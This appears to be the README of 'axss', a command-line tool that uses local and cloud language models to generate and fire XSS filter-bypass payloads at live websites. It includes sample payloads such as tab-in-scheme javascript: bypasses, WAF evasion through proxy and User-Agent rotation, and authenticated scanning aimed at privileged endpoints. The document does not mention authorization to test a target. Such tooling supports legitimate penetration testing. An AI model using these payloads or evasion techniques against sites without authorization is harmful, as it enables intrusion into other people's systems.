# axss

![Python](https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white)
![CLI](https://img.shields.io/badge/interface-CLI-111111)
![Ollama](https://img.shields.io/badge/Ollama-local%20runtime-111111?logo=ollama&logoColor=white)
![Qwen3.5](https://img.shields.io/badge/Qwen3.5-4B%20%7C%209B%20%7C%2027B%20%7C%2035B-0F766E)

`axss` is a context-aware XSS recon CLI that actively probes live targets, maps filter behavior, detects DOM sinks and framework fingerprints, and generates ranked, ready-to-fire payloads — including filter bypass variants tailored to what the probe observed. It runs entirely local-first with a self-learning findings store that gets smarter over time.

## How it works

```
[--active mode]
crawl target site  (BFS, same-origin, WAF-aware — disable with --no-crawl)
  • discovers all endpoints with non-tracking query parameters
  • deduplicates by path + param names (not values)
  • strips known tracking params (utm_*, gclid, fbclid, ranMID, …) before queuing
    ↓
[passive + probe mode]
fetch target HTML  (authenticated if --header / --cookies supplied)
    ↓
passive analysis
  • DOM sink detection (innerHTML, eval, location.href, jQuery, dangerouslySetInnerHTML, …)
  • Framework fingerprinting (React, Vue, Angular, AngularJS)
  • HTML attribute reflection (href, on*, srcdoc, style)
  • Encoding chain detection (base64, base32, URL, gzip+base64, rot13, …)
    ↓
active probing  (default on live URLs, disable with --no-probe)
  tracking/analytics params skipped automatically (utm_*, gclid, fbclid, ranMID, …)
  WAF-aware fetch: curl_cffi → HTTP/1.1 retry → Playwright (for akamai/cloudflare/datadome/…)
  phase 1: canary per parameter → finds reflection points and classifies context
           (js_string_dq/sq/bt, html_attr_url/value/event, html_body, html_comment, json_value)
  phase 2: char survival probe → confirms which XSS-critical chars survive the filter
    ↓
payload generation  (escalation chain)
  1. local Ollama (findings-enriched prompt — probe results + past bypass examples upfront)
  2. if local output is weak AND a cloud key is set → OpenRouter or OpenAI
     cloud payloads are saved to the findings store for future local runs
  3. heuristic engine always runs in parallel (context-aware, no LLM needed)
    ↓
ranking + threshold filter
  scored by sink match, probe confirmation, bypass family relevance, surviving chars
  default threshold: 60 — always shows at least 5 payloads
```

Optionally: **active scanner** (`--active`) crawls the site, fires payloads through a real Playwright browser, and confirms execution via alert dialogs, console output, or OOB network beacons. A persistent status bar shows scan progress, elapsed time, and ETA.

## Self-learning findings store

Every time a cloud model generates payloads, `axss` saves them to `~/.axss/findings/` keyed by sink type, reflection context, and surviving characters. On the next scan of a similar target, those findings are injected as few-shot examples into the local model prompt — so the local model reasons from real bypass patterns discovered by the stronger cloud model, without ever needing to call the cloud again.

The store grows silently in the background, capped at 500 entries (oldest roll off). Nothing is sent anywhere; it stays entirely local.

## Active probing

When scanning a live URL with query parameters, `axss` runs two probe requests per parameter by default:

1. **Canary request** — injects a unique token to find every reflection point and classify the HTML/JS context at each one.
2. **Char survival request** — wraps XSS-critical characters (`< > " ' ( ) ; / \ ` { }`) in sentinel markers to confirm which ones survive the server's filter.

**Tracking param filter:** Known analytics and affiliate parameters (`utm_*`, `gclid`, `fbclid`, `msclkid`, `ranMID`, `ranEAID`, Mailchimp, Klaviyo, etc.) are silently skipped before probing — they are never reflected in page content and would only waste requests.

**WAF-aware probe fetch:** When a browser-required WAF (akamai, cloudflare, datadome, kasada, perimeterx) is detected, probe requests are routed through a shared Playwright browser session instead of curl_cffi. For other targets, HTTP/2 stream errors (curl error 92) automatically retry as HTTP/1.1 before failing.

Probe results flow directly into payload generation: the LLM prompt leads with surviving chars and confirmed sink context; the heuristic engine generates bypass payloads tailored to what was observed (e.g. `java%09script:` tab bypass when `(` and `)` survive but `javascript:` is filtered in an href sink).

Live probe output streams as results arrive. Use `--no-live` to suppress streaming, `--no-probe` to skip probing entirely.

## Active scanner (`--active`)

The active scanner crawls the site to discover the full XSS attack surface, then fires payloads into a real Playwright browser and detects confirmed JavaScript execution. Each URL gets an isolated worker process. A persistent status bar tracks progress, elapsed time, and ETA throughout the scan.

**Surface discovery (crawl, on by default):**
- BFS-crawls from the seed URL, same-origin only, depth 2 by default
- Deduplicates endpoints by `path + sorted param names` — `?q=shoes` and `?q=boots` test the same surface, scanned once
- Strips tracking params from discovered URLs before queuing
- Uses the same WAF-aware fetch path as probing

**Detection methods:**
- `dialog` — `alert()` / `confirm()` / `prompt()` event triggered
- `console` — `console.log()` / `console.error()` fired
- `network` — outbound request to the internal beacon hostname

**Execution pipeline per URL:**
1. Crawl site to discover endpoints (unless `--no-crawl`)
2. Probe all non-tracking query parameters for reflection and character survival
3. **Phase 1** — mechanical transform variants (encoding, template tricks, namespace escapes, etc.)
4. **Local model** — AI-generated payloads for unconfirmed params
5. **Cloud escalation** — if still unconfirmed and a cloud key is configured

Confirmed findings are written to `~/.axss/reports/<domain>_<timestamp>.md`.

```bash
# Active scan — crawls site first (default), then scans discovered endpoints
axss -u "https://example.com" --active

# Active scan — skip crawl, test only the provided URL
axss -u "https://example.com/search?q=test" --active --no-crawl

# Active scan — crawl deeper (default depth is 2)
axss -u "https://example.com" --active --depth 3

# Active scan, batch URLs (no crawl — list is already explicit)
axss --urls urls.txt --active --workers 3 --timeout 120

# Active scan, authenticated target
axss -u "https://app.example.com" --active --cookies cookies.txt
```

## Authenticated scanning (`--header` / `--cookies`)

Pass session credentials so every request — fetch, probe, and payload firing — carries the same auth context. The LLM prompt is also told the session is authenticated so it can suggest payloads targeting privileged endpoints.

```bash
# Bearer token
axss -u "https://api.example.com/v1/search?q=x" \
     --header "Authorization: Bearer eyJ..."

# API key header
axss -u "https://app.example.com/search?q=x" \
     --header "X-API-Key: abc123"

# Browser session cookies (export with a browser extension, e.g. "Export Cookies")
axss -u "https://app.example.com/dashboard?tab=x" \
     --cookies cookies.txt

# Combined: token + cookies
axss -u "https://app.example.com/admin?q=x" \
     --header "Authorization: Bearer TOKEN" \
     --cookies cookies.txt

# Active scanner + auth (crawls the site with auth headers)
axss -u "https://app.example.com" --active \
     --header "Authorization: Bearer TOKEN"
```

**cookies.txt format** — standard Netscape HTTP Cookie File (tab-separated):
```
# Netscape HTTP Cookie File
.example.com	TRUE	/	FALSE	0	session_id	abc123
.example.com	TRUE	/	TRUE	0	csrf_token	xyz789
```
Most browser cookie export extensions produce this format directly.

## Model escalation chain

```
Local Ollama  (qwen3.5:9b default, findings-enriched prompt)
    ↓  if output is weak (< 3 payloads or all generic)
OpenRouter    (preferred cloud — set OPENROUTER_API_KEY or add to ~/.axss/keys)
    ↓  if OpenRouter unavailable or fails
OpenAI        (gpt-4o-mini — set OPENAI_API_KEY or add to ~/.axss/keys)
    ↓  if no API keys / both fail
Heuristic-only  (always works, no network needed)
```

Cloud escalation only triggers when the local model's output fails a quality check. Use `--no-cloud` to guarantee offline-only operation even if a key is set, or set `use_cloud: false` in `~/.axss/config.json` to make that permanent.

## Payload generation

`axss` combines three sources and ranks the union:

- **Heuristic engine** — context-aware, deterministic. Generates payloads for every detected sink: encoded param delivery (base64/UU/etc.), href whitespace bypasses (`%09`/`%0a`/`%0d` in scheme), event handler injection, DOM source payloads, jQuery HTML sinks, probe-confirmed contexts, and more.
- **LLM generation** — local Ollama (or cloud fallback) receives the full parsed context, probe results, auth context, and relevant past findings, then generates additional targeted payloads.
- **Public payload database** — `--public` fetches community XSS payloads and injects a diverse sample as reference examples into the LLM prompt.

## Setup

### Fast path

```bash
./setup.sh
axss --help
```

`setup.sh` installs Ollama (if missing), detects your RAM/VRAM, pulls the right Qwen3.5 tier, writes `~/.axss/config.json`, builds the venv, and symlinks `axss` to `~/.local/bin/axss`.

### Manual setup

```bash
# 1. Install Ollama
curl -fsSL https://ollama.com/install.sh | sh
ollama serve

# 2. Pull a model
ollama pull qwen3.5:9b   # balanced default
ollama pull qwen3.5:4b   # low memory
ollama pull qwen3.5:27b  # higher quality (32 GB+ RAM)
ollama pull qwen3.5:35b  # GPU tier (24 GB+ VRAM)

# 3. Configure
mkdir -p ~/.axss
cat > ~/.axss/config.json <<'EOF'
{
  "default_model": "qwen3.5:9b",
  "use_cloud": true,
  "cloud_model": "anthropic/claude-3-5-sonnet"
}
EOF

# 4. Install
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
playwright install chromium --with-deps
```

### Model sizing

| Tier | Model | Recommended hardware |
|------|-------|----------------------|
| Low | `qwen3.5:4b` | < 8 GB RAM |
| Standard | `qwen3.5:9b` | 8–32 GB RAM |
| High | `qwen3.5:27b` | 32 GB+ RAM |
| GPU | `qwen3.5:35b` | 24 GB+ NVIDIA VRAM |

### Cloud configuration (optional)

API keys can be set as environment variables **or** stored in `~/.axss/keys` (preferred — no need to export them in every shell session):

```
# ~/.axss/keys
openrouter_api_key = sk-or-v1-...
openai_api_key     = sk-...
```

```bash
# Or via environment variables
export OPENROUTER_API_KEY="sk-or-..."   # preferred cloud
export OPENAI_API_KEY="sk-..."          # fallback cloud

# Set preferred OpenRouter model in ~/.axss/config.json:
# "cloud_model": "google/gemini-2.0-flash-001"
```

Verify all keys are valid:

```bash
axss --check-keys
```

```
Checking API keys (keys file: /home/user/.axss/keys)

  [+]  Ollama      http://127.0.0.1:11434  3 model(s) loaded: qwen3.5:9b, qwen3.5:4b …
  [+]  OpenRouter  keys file               free tier
  [-]  OpenAI      not set                 add openai_api_key = sk-... to ~/.axss/keys or set OPENAI_API_KEY
```

## Usage

### Common examples

```bash
# Scan a live target with active probing (default)
axss -u "https://example.com/search?q=test"

# Verbose output — see probe results, findings store hits, escalation decisions
axss -u "https://example.com/search?q=test" -v --threshold 50

# Skip active probing (passive analysis only)
axss -u "https://example.com" --no-probe

# Suppress live probe stream, show final output only
axss -u "https://example.com?q=test" --no-live

# Force offline — never escalate to cloud even if keys are set
axss -u "https://example.com?q=test" --no-cloud

# Public payload reference + WAF context
axss -u "https://example.com?q=test" --public --waf cloudflare -o heat

# Parse local HTML
axss -i sample_target.html -o list -t 10

# Parse an inline HTML snippet
axss -i '<script>eval(location.hash.slice(1))</script>'

# Batch scan with rate limiting
axss --urls urls.txt -r 5 -o list

# Merge batch URLs into one payload set
axss --urls urls.txt --merge-batch -o json -j result.json

# Write JSON to disk
axss -u "https://example.com?q=test" -o json -j result.json

# Dump public payloads for a WAF (no target needed)
axss --public --waf modsecurity -o list

# Validate all configured API keys
axss --check-keys

# List local Ollama models
axss -l

# Search available models
axss -s qwen3.5

# Authenticated scan — bearer token
axss -u "https://app.example.com/search?q=x" --header "Authorization: Bearer TOKEN"

# Authenticated scan — cookies.txt from browser export
axss -u "https://app.example.com/dashboard?tab=x" --cookies cookies.txt

# Active scanner — crawls site then confirms execution in browser
axss -u "https://example.com" --active

# Active scanner — skip crawl, test this URL only
axss -u "https://example.com/search?q=test" --active --no-crawl

# Active scanner — crawl deeper, more workers
axss -u "https://example.com" --active --depth 3 --workers 3

# Active scanner — authenticated, batch URLs (no crawl needed)
axss --urls urls.txt --active --workers 3 --cookies cookies.txt
```

### All flags

| Flag | Default | Description |
|------|---------|-------------|
| `-u, --url TARGET` | — | Fetch and scan a live URL |
| `--urls FILE` | — | Scan one URL per line from a file |
| `-i, --input FILE_OR_SNIPPET` | — | Parse a local file or raw HTML string |
| `--public` | off | Fetch community XSS payloads and inject as reference |
| `--waf NAME` | auto | Set WAF context (auto-detected from response headers) |
| `-m, --model MODEL` | config | Override the local Ollama model |
| `-o, --output` | `list` | Output format: `list`, `heat`, `json`, `interactive` |
| `-t, --top N` | 20 | Max payloads to display |
| `-j, --json-out PATH` | — | Always write full JSON result to this path |
| `-r, --rate N` | 25 | Max requests/sec against target (0 = uncapped) |
| `--threshold N` | 60 | Min risk score for output (always shows ≥ 5) |
| `--no-probe` | off | Skip active parameter probing |
| `--no-live` | off | Suppress streaming probe output |
| `--no-cloud` | off | Never escalate to cloud LLM |
| `--header 'Name: Value'` | — | Add a custom request header (repeatable) |
| `--cookies FILE` | — | Load session cookies from a Netscape cookies.txt file |
| `-a, --active` | off | Fire payloads in Playwright and confirm execution |
| `--workers N` | 1 | Max parallel active-scan worker processes |
| `--timeout N` | 300 | Per-URL timeout in seconds for active scan workers |
| `--no-crawl` | off | Skip crawling — test only the provided URL directly |
| `--depth N` | 2 | BFS crawl depth (1 = seed page links only) |
| `--check-keys` | — | Validate all configured API keys and report status |
| `-v, --verbose` | off | Show detailed sub-step progress |
| `--merge-batch` | off | Combine batch contexts into one payload set |
| `-l, --list-models` | — | List local Ollama models |
| `-s, --search-models QUERY` | — | Search Ollama model library |
| `-V, --version` | — | Show version |

### Supported WAFs

`cloudflare`, `akamai`, `imperva`, `aws`, `f5`, `modsecurity`, `fastly`, `sucuri`, `barracuda`, `wordfence`, `azure`

## Output modes

- **`list`** — ranked table with payload, inject vector, tags, and risk score.
- **`heat`** — compact risk heat view, good for quick triage.
- **`json`** — full structured output for automation and post-processing.
- **`interactive`** — browse payloads in a scrollable TUI.

## Sample output

```text
$ axss -u "https://target.example/page?url=test" -v --threshold 70

[~] Rate limit: 25 req/sec
[*] Probing for WAF on https://target.example/page?url=test...
[~] No WAF fingerprint detected — use --waf to set manually.
[*] Fetching/parsing target: https://target.example/page?url=test
[*] Active probing query parameters...
[+] [probe] 'url' → html_attr_url(href) | chars='()/;`{}' | INJECTABLE

 1. [96] JavaScript URI injection [url]
    payload: javascript:alert(document.domain)
    inject:  ?url=javascript%3Aalert%28document.domain%29
    tags:    probe-confirmed, html_attr_url, param:url

[+] Probing complete: 1/1 parameter(s) injectable, 1 reflected.
[*] Generating payloads with qwen3.5:9b...
[~]   Findings store: no prior findings for this context.
[~]   Generating payloads...
[~]   Local model output weak — attempting cloud escalation...
[~]   No cloud API keys configured — running heuristic-only.
[+] Done. 6 payloads above threshold 70 (32 below, 38 total).

 1. [95] href javascript: bypass — leading tab (\x09)
    payload: [TAB]javascript:alert(document.domain)
    inject:  ?url=%09javascript%3Aalert%28document.domain%29
    tags:    href, javascript-url, whitespace-bypass, filter-bypass

 2. [87] href javascript: bypass — tab (\x09) in scheme
    payload: java[TAB]script:alert(document.domain)
    inject:  ?url=java%09script%3Aalert%28document.domain%29
    tags:    href, javascript-url, whitespace-bypass, filter-bypass
```

## Environment variables

| Variable | Purpose |
|----------|---------|
| `OPENROUTER_API_KEY` | Enables OpenRouter cloud escalation |
| `OPENAI_API_KEY` | Enables OpenAI cloud escalation (fallback) |
| `OLLAMA_HOST` | Override Ollama base URL (default: `http://127.0.0.1:11434`) |
| `AXSS_USER_AGENTS` | File path or comma-separated User-Agent strings to rotate |
| `AXSS_PROXIES` | File path or comma-separated proxy list |

## Keys file (`~/.axss/keys`)

```
# ~/.axss/keys  — simple KEY=value, one per line, # for comments
openrouter_api_key = sk-or-v1-...
openai_api_key     = sk-...
```

Values are read at runtime; no shell export needed. Use `axss --check-keys` to verify them at any time.

## Config file (`~/.axss/config.json`)

```json
{
  "default_model": "qwen3.5:9b",
  "use_cloud": true,
  "cloud_model": "anthropic/claude-3-5-sonnet"
}
```

| Key | Default | Description |
|-----|---------|-------------|
| `default_model` | `qwen3.5:9b` | Local Ollama model |
| `use_cloud` | `true` | Allow cloud escalation when local output is weak |
| `cloud_model` | `anthropic/claude-3-5-sonnet` | Preferred OpenRouter model |

## Findings store (`~/.axss/findings/`)

Each finding is a JSON object capturing:

- `sink_type` — e.g. `reflected_in_href`, `js_string_via_base64`
- `context_type` — e.g. `html_attr_url`, `js_string_dq`
- `surviving_chars` — chars confirmed to survive the filter
- `bypass_family` — one of 16 named families (whitespace-in-scheme, js-string-breakout, constructor-chain, …)
- `payload` / `test_vector` — the exact payload and delivery vector
- `model` — which model generated it
- `verified` — `true` when confirmed to execute in browser (via `--active`)

Future local runs retrieve findings by scoring sink type match (+4), context type match (+3), surviving char overlap (+1–3), and verified status (+2), then inject the top matches as few-shot examples into the prompt.

Active scan confirmed findings are additionally written to `~/.axss/reports/<domain>_<timestamp>.md`.

## Notes

- The heuristic engine runs regardless of LLM availability — `axss` is always useful offline.
- Live crawling uses Scrapling with stealth headers and a curl_cffi → HTTP/1.1 → Playwright fallback chain for WAF-protected targets.
- `axss -l` wraps `ollama list`; `axss -s <query>` prefers `ollama search` and falls back to Ollama web search.
- The default model comes from `~/.axss/config.json`; falls back to `qwen3.5:9b` if missing.
- Active scanner is limited to reflected XSS; stored and DOM-only XSS are not yet confirmed automatically.
